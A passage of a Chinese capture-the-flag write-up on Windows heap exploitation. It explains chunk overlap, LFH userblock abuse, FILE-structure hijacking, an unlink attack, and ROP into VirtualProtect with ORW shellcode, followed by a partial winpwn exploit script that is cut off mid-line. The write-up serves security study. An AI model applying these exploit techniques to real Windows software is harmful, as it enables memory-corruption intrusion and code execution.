class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">                        +-----------+  </span><br><span class="line">create(0x3F8, 1)  ---&gt;  |   0x400   |    </span><br><span class="line">                        +-----------+  -----</span><br><span class="line">create(0x408, 2)  ---&gt;  |   0x410   |    |</span><br><span class="line">                        +-----------+    |</span><br><span class="line">create(0x4E8, 3)  ---&gt;  |   0x4F0   |    |</span><br><span class="line">                        +-----------+  0x1000</span><br><span class="line">create(0x378, 4)  ---&gt;  |   0x380   |    |      ---&gt; to be freed </span><br><span class="line">                        +-----------+    |</span><br><span class="line">create(0x378, 5)  ---&gt;  |   0x380   |    |      ---&gt; victim chunk</span><br><span class="line">                        +-----------+  -----</span><br><span class="line">create(0x3F8, 6)  ---&gt;  |   0x400   |           ---&gt; gap</span><br><span class="line">                        +-----------+</span><br><span class="line">create(0x378, 7)  ---&gt;  |   0x380   |</span><br><span class="line">                        +-----------+</span><br><span class="line">create(0x378, 8)  ---&gt;  |   0x380   |</span><br><span class="line">                        +-----------+</span><br></pre></td></tr></table></figure></li><li>然后通过<code>LazyFileHandler</code>提供的<code>open</code>和<code>read</code>读取0x3F8 bytes的内容到chunk 1中，这样在<code>show</code> chunk 1的时候，可以leak出chunk 2的header，但是被encode过了；不过只要手动还原出原始头然后decode，就能得到<code>_HEAP-&gt;Encoding</code>了。</li><li>由于<code>edit</code>的逻辑是如果<code>strlen</code>更长的话，读入的size就变长： <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">v19 = <span class="number">-1</span>i64;</span><br><span class="line">v20 = (_BYTE *)<span class="built_in">array</span>[v18].<span class="built_in">buffer</span>;</span><br><span class="line">v21 = <span class="built_in">array</span>[v18].<span class="built_in">size</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    ++v19;</span><br><span class="line"><span class="keyword">while</span> ( v20[v19] );</span><br><span class="line"><span class="keyword">if</span> ( v19 &gt; v21 &amp;&amp; <span class="built_in">array</span>[v18].edit_status == <span class="number">0xDDAABEEF1ACD</span>i64 )</span><br><span class="line">&#123;</span><br><span class="line">    v21 = <span class="number">-1</span>i64;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        ++v21;</span><br><span class="line">    <span class="keyword">while</span> ( v20[v21] );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">read</span>(<span class="number">0</span>, v20, v21) &lt;= <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"read error"</span>);</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> 因此对chunk 1进行<code>edit</code>，就可以覆盖到chunk 2的header，将其size修改为0x1000即可覆盖chunk 2、3、4、5。</li><li>由于<code>LazyFileHandler</code>提供的<code>open</code>可以无限调用，并且每次都会申请一个0x60大小的chunk存放<code>FILE</code>结构体；再加上LFH(LowFragmentationHeap)的机制，到一定程度的时候，会开启LFH，即<br>分配一个大的chunk用作userblock（这里<a href="https://github.com/scwuaptx/LazyFragmentationHeap/blob/master/LazyFragmentationHeap_slide.pdf" target="_blank" rel="noopener">Slides</a>里面提到的大小是0x1000，可能我本机环境不同，实际上只有0x810）。<br> 然而实际调试中，先于0x60的chunk，0x20的chunk会先开启LFH，所以同样会从上面构造的0x1000的overlapped chunk中割出0x410作为userblock，这样<code>FILE</code>结构体就落在overlapped chunk + 0x410的位置了。</li><li>此时chunk 3的位置正好存放了一个堆地址，这是原来chunk的Flink，通过show chunk 3，我们可以得到堆地址。（这里地址会有微小的变化，从而影响了后面需要用到堆地址的部分，也造成了最后的exp概率性失败，不过成功率依然很高）。</li><li>既然<code>FILE</code>结构体落在chunk 3、4的空间内，由于LFH位置的不确定性，具体<code>FILE</code>落在userblock的哪个chunk里未知，但是我们可以全部填满伪造的<code>FILE</code>结构体。<br> 这里主要是要伪造<code>FILE</code>的<code>fd = 0</code>，以及<code>buffer = 0xBEEFDAD0000 + 0x28 * 5 + 0x20</code>，即第六个<code>file_buf</code>结构体的<code>buffer</code>处，从而类似于Linux下<code>_IO_FILE</code>的利用，后面调用<code>LazyFileHandler</code>提供的<code>fread_s((void *)array[v9].buffer, v10, 1ui64, v10, Stream);</code>，实际上是从标准输入中读到<code>0xBEEFDAD0000 + 0x28 * 5 + 0x20</code>这个位置，从而可以覆盖掉<code>file_buf-&gt;buffer</code>指针，达到任意地址读的功能。<br> 由于windows的特性，无论是程序本身，还是加载的dll，在一定时间内其基址都是不变的，因此虽然程序运行一次只能调用read file两次，即只能完成一次任意地址读（或写），但是可以多次运行程序读不同的地址即可。<br> 所以这里先把程序基址和ucrtbase的地址给leak出来了。</li><li>当然仅仅是任意地址读显然是不够得，我们得劫持程序控制流读出flag来。<br> 注意到在<code>FILE</code>所用的userblock被分配出来之后，我们之前构造的overlapped chunk仍然有0x3E0的空间留下来，而这个0x3E0的空间把chunk 5的header和Flink、Blink给overlap了。<br> 所以可以分配出这个0x3E0的chunk，修改chunk 5的header为freed状态，以及修改Flink和Blink满足unlink check，再free chunk 4完成unlink attack，在<code>0xBEEFDAD0000 + 0x28 * 4 + 0x20</code>写入了一个指向本身的指针。<br> 另外，由于chunk 5本身是没有在Freelist或者ListHints中的，所以这些链表都没有corruption，只是可能存在被overlapped的LFH userblock被破坏了的问题，不过不影响后续的利用。</li><li>完成上述利用之后，我们可以构造出这样的primitive： <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">file_buf[<span class="number">6</span>]-&gt;<span class="built_in">buffer</span> = &amp;file_buf[<span class="number">6</span>]-&gt;edit_status; </span><br><span class="line"><span class="comment">// then use chunk 6 to edit</span></span><br><span class="line">file_buf[<span class="number">7</span>]-&gt;edit_status = <span class="number">0xDDAABEEF1ACD</span>;</span><br><span class="line">file_buf[<span class="number">7</span>]-&gt;<span class="built_in">buffer</span> = arbitrary_addr;</span><br><span class="line">file_buf[<span class="number">8</span>]-&gt;edit_status = <span class="number">00</span>xDDAABEEF1ACD;</span><br><span class="line">file_buf[<span class="number">8</span>]-&gt;<span class="built_in">buffer</span> = &amp;file_buf[<span class="number">6</span>]-&gt;edit_status;</span><br><span class="line"><span class="comment">// then use chunk 7 to arbitrary read or write</span></span><br><span class="line">....</span><br><span class="line"><span class="comment">// then use chunk 8 to edit, make chunk 6 can edit again</span></span><br><span class="line">file_buf[<span class="number">6</span>]-&gt;<span class="built_in">buffer</span> = &amp;file_buf[<span class="number">6</span>]-&gt;edit_status; </span><br><span class="line">file_buf[<span class="number">6</span>]-&gt;edit_status = <span class="number">00</span>xDDAABEEF1ACD;</span><br></pre></td></tr></table></figure> 因此只要不断调用以上的primitive，就可以实现任意次数的任意地址读和写。</li><li>但是存在的问题是，<code>p64(0xDDAABEEF1ACD)</code>中存在”\x1A”字符，在windows中，这个字符备用表示字符串流的结尾，因此如果输入中存在这个字符，那么它后面的字符都不会被接受，那我们上面构造的primitive就用不了了。<br> 然而注意到，我们做leak和做最后利用的时候是分开的，也就是说read file的功能还只用了一次，于是我们可以同上面提到的任意地址读（或写）一次，将<code>ucrtbase!_pioinfo[0] + 0x38</code>上1 byte的flag标志置为<code>0x09</code>，这样可以把输入流模式从字符流改为二进制流，这样任意字符都可以读入了。<br> 需要注意的是<code>ucrtbase!_pioinfo[0] + 0x38</code>是个堆地址，所以其偏移是相对稳定的（有时会稍微变化），再加上堆地址我们早就得到了，所以完全可以预测到它的位置。</li><li>那么承接使用上面的primitive，我们可以：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kernel32.ll -&gt; ntdll.dll -&gt; ntdll!PebLdr - <span class="number">0x78</span> --&gt; PEB --&gt; TEB --&gt; stack_end</span><br></pre></td></tr></table></figure>完成一条leak链，然后从stack搜索返回地址。</li><li>注意到<code>main</code>函数是不会返回的，只会直接<code>exit</code>，所以这里采用劫持<code>_read</code>函数的返回地址的方法。<br>这是因为我们最后写ROP的时候，一定是通过<code>edit</code>功能写的，而归根到底是通过<code>_read</code>写的，那么覆盖<code>_read</code>的返回地址就可以在返回的时候劫持到程序控制流了。<br>至于怎么定位<code>_read</code>返回地址的位置，由于我们是通过<code>show</code>功能进行leak的，最终也是通过调用<code>printf</code>打印的，而<code>printf</code>和<code>_read</code>使用的栈帧是同样的，即返回地址存放在栈上的地址是一致的。<br>故我们只要以<code>printf</code>的返回地址作为标志，搜索栈内存空间，即可同样定位到<code>_read</code>的返回地址所在的位置。</li><li>此外有一个需要注意的点是，虽然AngelBoy的Slides中提到了Child Process Policy，在Ex师傅的博客地下的评论中也有”新版的Windows API新增 PROCESS_MITIGATION_CHILD_PROCESS_POLICY 的功能”这样一句话，但是实际在本地调试中并没有感受到它的存在，虽然最后写<code>system</code>的ROP时候并没有getshell，但其原因貌似在于LFH userblock corruption了，至于实际情况还有待考证。</li><li>因此这里采用Slides中的做法，也是最稳健的做法，即通过任意地址写在<code>.data</code>段上写入一段orw的shellcode，然后ROP调用<code>VirtualProtect</code>修改<code>.data</code>段的权限为RWX，最后跳转到shellcode执行即可。</li></ol><h2 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote("node3.buuoj.cn", 26659)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Attack</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.menu = &#123;</span><br><span class="line">            <span class="string">"create"</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">"edit"</span>: <span class="number">2</span>,</span><br><span class="line">            <span class="string">"show"</span>: <span class="number">3</span>,</span><br><span class="line">            <span class="string">"delete"</span>: <span class="number">4</span>,</span><br><span class="line">            <span class="string">"file"</span>: <span class="number">5</span>,</span><br><span class="line">            <span class="string">"exit"</span>: <span class="number">6</span>,</span><br><span class="line">            <span class="string">"open"</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">"read"</span>: <span class="number">2</span>,</span><br><span class="line">            <span class="string">"back"</span>: <span class="number">3</span></span><br><span class="line">        &#125;</span><br><span class="line">        self.array_addr = <span class="number">0xBEEFDAD0000</span></span><br><span class="line"></span><br><span class="line">        self.p = <span class="literal">None</span></span><br><span class="line">        self.encoding = <span class="literal">None</span></span><br><span class="line">        self.heap_addr = <span class="literal">None</span></span><br><span class="line">        self.text_base = <span class="literal">None</span></span><br><span class="line">        self.ucrtbase = <span class="literal">None</span></span><br><span class="line">        self.pioinfo_offset = <span class="literal">None</span></span><br><span class="line">        self.kernel32 = <span class="literal">None</span></span><br><span class="line">        self.ntdll = <span class="literal">None</span></span><br><span class="line">        self.PEB = <span class="literal">None</span></span><br><span class="line">        self.TEB = <span class="literal">None</span></span><br><span class="line">        self.stack_end = <span class="literal">None</span></span><br><span class="line">        self.ret_address_in_stack = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.do_simple_leak()</span><br><span class="line">                self.do_attack()</span><br><span class="line">                <span class="comment"># self.debug()</span></span><br><span class="line">                self.show_info()</span><br><span class="line">                self.p.interactive()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> AssertionError <span class="keyword">as</span> e:</span><br><span class="line">                self.p.close()</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">                self.p.close()</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                self.p.close()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">'1'</span>:</span><br><span class="line">            windbgx.attach(self.p)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">choose_func</span><span class="params">(self, choice)</span>:</span></span><br><span class="line">        self.p.sendlineafter(<span class="string">"Your choice: "</span>, str(self.menu[choice]), timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(self, size, idx)</span>:</span></span><br><span class="line">        self.choose_func(<span class="string">"create"</span>)</span><br><span class="line">        self.p.sendlineafter(<span class="string">"Size:"</span>, str(size))</span><br><span class="line">        self.p.sendlineafter(<span class="string">"ID"</span>, str(idx))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(self, idx, content)</span>:</span></span><br><span class="line">        self.choose_func(<span class="string">"edit"</span>)</span><br><span class="line">        self.p.sendlineafter(<span class="string">"ID"</span>, str(idx), timeout=<span class="number">1</span>)</span><br><span class="line">        self.p.sendafter(<span class="string">"Content:"</span>, content)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(self, idx)</span>:</span></span><br><span class="line">        self.choose_func(<span class="string">"show"</span>)</span><br><span class="line">        self.p.sendlineafter(<span class="string">"ID"</span>, str(idx))</span><br><span class="line">        self.p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(self, idx)</span>:</span></span><br><span class="line">        self.choose_func(<span class="string">"delete"</span>)</span><br><span class="line">        self.p.sendlineafter(<span class="string">"ID"</span>, str(idx), timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open_file</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.choose_func(<span class="string">"file"</span>)</span><br><span class="line">        self.choose_func(<span class="string">"open"</span>)</span><br><span class="line">        self.choose_func(<span class="string">"back"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_file</span><span class="params">(self, idx, size, content=None)</span>:</span></span><br><span class="line">        self.choose_func(<span class="string">"file"</span>)</span><br><span class="line">        self.choose_func(<span class="string">"read"</span>)</span><br><span class="line">        self.p.sendlineafter(<span class="string">"ID"</span>, str(idx))</span><br><span class="line">        self.p.sendlineafter(<span class="string">"Size:"</span>, str(size))</span><br><span class="line">        <span class="keyword">if</span> content:</span><br><span class="line">            self.p.send(content)</span><br><span class="line">        self.choose_func(<span class="string">"back"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.choose_func(<span class="string">"exit"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ctor_heap_head</span><span class="params">(self, size, flags, prev_size, remain_size)</span>:</span></span><br><span class="line">        chksum =  ((size &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xff</span>) ^ ((size &gt;&gt; <span class="number">4</span>) &gt;&gt; <span class="number">8</span>) ^ flags</span><br><span class="line">        val = (size &gt;&gt; <span class="number">4</span>) | (flags &lt;&lt; <span class="number">16</span>) | (chksum &lt;&lt; <span class="number">24</span>) | (prev_size &gt;&gt; <span class="number">4</span> &lt;&lt; <span class="number">32</span>) | (remain_size &lt;&lt; <span class="number">56</span>)</span><br><span class="line">        <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ctor_fake_file</span><span class="params">(self, buf, fileno)</span>:</span></span><br><span class="line">        fake_file = <span class="string">""</span></span><br><span class="line">        fake_file += p64(<span class="number">0</span>) + p64(buf) <span class="comment"># buffer</span></span><br><span class="line">        fake_file += p32(<span class="number">0</span>) + p32(<span class="number">0x2080</span>)</span><br><span class="line">        fake_file += p64(fileno) <span class="comment"># fileno = 0</span></span><br><span class="line">        fake_file += p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>)</span><br><span class="line">        fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>)</span><br><span class="line">        fake_file += p64(<span class="number">0xFFFFFFFF</span>)</span><br><span class="line">        fake_file += p64(<span class="number">0x0</span>) * <span class="number">2</span></span><br><span class="line">        fake_file += p64(<span class="number">0x0</span>)</span><br><span class="line">        fake_file += p64(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> fake_file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prepare</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.create(<span class="number">0x3F8</span>, <span class="number">1</span>)</span><br><span class="line">        self.create(<span class="number">0x408</span>, <span class="number">2</span>)</span><br><span class="line">        self.create(<span class="number">0x4E8</span>, <span class="number">3</span>)</span><br><span class="line">        self.create(<span class="number">0x378</span>, <span class="number">4</span>) </span><br><span class="line">        self.create(<span class="number">0x378</span>, <span class="number">5</span>) <span class="comment"># --&gt; victim</span></span><br><span class="line">        self.create(<span class="number">0x3F8</span>, <span class="number">6</span>) <span class="comment"># gap</span></span><br><span class="line">        self.create(<span class="number">0x378</span>, <span class="number">7</span>) <span class="comment"># --&gt; to be freed</span></span><br><span class="line">        self.create(<span class="number">0x378</span>, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># leak encoding</span></span><br><span class="line">        self.open_file()</span><br><span class="line">        self.read_file(<span class="number">1</span>, <span class="number">0x3F8</span>)</span><br><span class="line">        self.show(<span class="number">1</span>)</span><br><span class="line">        self.p.recvuntil(<span class="string">", use th"</span>)</span><br><span class="line">        encode_head = u64(self.p.recv(<span class="number">6</span>) + <span class="string">"\x00\x08"</span>)</span><br><span class="line">        self.encoding = self.ctor_heap_head(<span class="number">0x410</span>, <span class="number">0x1</span>, <span class="number">0x400</span>, <span class="number">0x8</span>) ^ encode_head</span><br><span class="line"></span><br><span class="line">        <span class="comment"># overwrite chunk 2's head</span></span><br><span class="line">        fake_head = self.ctor_heap_head(<span class="number">0x1000</span>, <span class="number">0x1</span>, <span class="number">0x400</span>, <span class="number">0x8</span>) ^ self.encoding</span><br><span class="line">        self.edit(<span class="number">1</span>, <span class="string">"A"</span> * <span class="number">0x3F8</span> + p64(fake_head)[:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment"># chunk overlap</span></span><br><span class="line">        self.delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># use LFH, which is just at chunk 3's space</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">            self.open_file()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># leak heap address</span></span><br><span class="line">        self.show(<span class="number">3</span>)</span><br><span class="line">        self.heap_addr = u64(self.p.recvline()[:<span class="number">-2</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">        <span class="keyword">assert</span>(self.heap_addr != <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># hijack FILE struct</span></span><br><span class="line">        payload = <span class="string">"\x00"</span> * <span class="number">0x50</span> <span class="comment"># padding</span></span><br><span class="line">        payload += self.ctor_fake_file(self.array_addr + <span class="number">0x28</span> * <span class="number">5</span> + <span class="number">0x20</span>, <span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">        self.edit(<span class="number">3</span>, payload)</span><br><span class="line">        payload = <span class="string">"\x00"</span> * <span class="number">0x40</span> <span class="comment"># padding</span></span><br><span class="line">        payload += self.ctor_fake_file(self.array_addr + <span class="number">0x28</span> * <span class="number">5</span> + <span class="number">0x20</span>, <span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">        self.edit(<span class="number">4</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">leak_text_base</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># use fread to arbitrary write and read</span></span><br><span class="line">        target_addr = self.heap_addr + <span class="number">0xCFB2</span> - <span class="number">0xCB50</span> <span class="comment"># skip \x00\x00</span></span><br><span class="line">        self.read_file(<span class="number">8</span>, <span 